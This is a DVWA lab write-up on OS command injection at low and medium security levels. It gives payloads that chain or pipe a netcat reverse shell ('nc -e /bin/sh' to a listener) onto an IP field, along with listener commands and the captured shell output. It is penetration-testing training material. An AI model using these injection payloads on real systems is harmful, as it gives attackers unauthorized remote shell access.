### Code Execution-DVWA-Security-Level-Low

* Allows an attacker to execute OS commands.

* The program ask the user to enter in a ip address, in which the server will ping.
* So i enter in my ip address

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.000 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.065 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.064 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.000/0.043/0.065/0.030 ms
```

* The server takes my ipadress and executes the ping command with it.
* Now in Linux systems you can strings together commands by using ;
* Example

```
root@kali:/tmp/files# ls; pwd
file1  file2  file3
/tmp/files
```

* Here i just chained together the ls and pwd commands.
* We can do something similar by chaining to together and a ip address and nc shell.

* Steps

1. Create a netcat listener on any port.

```
root@kali:~# nc -vv -l -p 4444
listening on [any] 4444 ...
```

2. Now chain to together a ip address and netcat shell.

```
127.0.0.1; nc -e /bin/sh 10.0.2.15 4444
````

3. Now we should get a reverse netcat shell.

```
root@kali:~# nc -vv -l -p 4444
listening on [any] 4444 ...
10.0.2.5: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.5] 43666
lss
ls
help
index.php
source
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


---

### Code Execution-DVWA-Security-Level-Medium

* In this Security Level, there seems to be some blacklist filtering.
* The ; is filter meaning we can't use that command to get command injection.

* In Unix systems, there is a feature called pipe

```
|
```

* Pipe is essentially getting a commands output and feeding it into another command input.
* So we can use this method to get a code execution.

* Steps

1. Setup a netcat listener.

```
root@kali:~# nc -vv -l -p 4444
```

2. Pipe the ipaddress to netcat shell.

```
127.0.0.1 | nc -e /bin/sh 10.0.2.15 4444
```


3. Get the reverse shell and thats it.

```
root@kali:~# nc -vv -l -p 4444
listening on [any] 4444 ...
10.0.2.5: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.5] 35878
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

